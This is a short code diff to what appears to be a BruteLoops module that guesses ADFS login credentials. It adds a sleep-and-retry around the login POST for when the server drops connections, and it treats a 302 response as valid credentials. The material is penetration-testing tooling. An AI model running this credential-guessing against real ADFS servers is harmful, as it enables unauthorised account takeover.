@@ -1,6 +1,8 @@
 import requests
-from BruteLoops.example.shortcuts.http import HTTPModule
+from BruteLoops.example.module import Module as BModule
+from BruteLoops.example.shortcuts.http import Module,HTTPModule
 from logging import getLogger,INFO
+from time import sleep
 
 brute_logger = getLogger('BruteLoops.example.modules.http.adfs')
 getLogger('urllib3.connectionpool').setLevel(INFO)
@@ -26,12 +28,23 @@ class Module(HTTPModule):
         }
         
         # Make the request while ignoring redirects
-        resp = requests.post(
-            self.url,
-            data=payload,
-            proxies=self.proxies,
-            headers=self.headers,
-            allow_redirects=False)
+        try:
+            resp = requests.post(
+                self.url,
+                data=payload,
+                proxies=self.proxies,
+                headers=self.headers,
+                allow_redirects=False)
+        except requests.exceptions.ConnectionError:
+            # ADFS appears to fall over on occasion
+            # Sleep for a few moments, then try again
+            sleep(5)
+            resp = requests.post(
+                self.url,
+                data=payload,
+                proxies=self.proxies,
+                headers=self.headers,
+                allow_redirects=False)
 
         # Credentials should be valid on a 302 redirect
         if resp.status_code == 302:
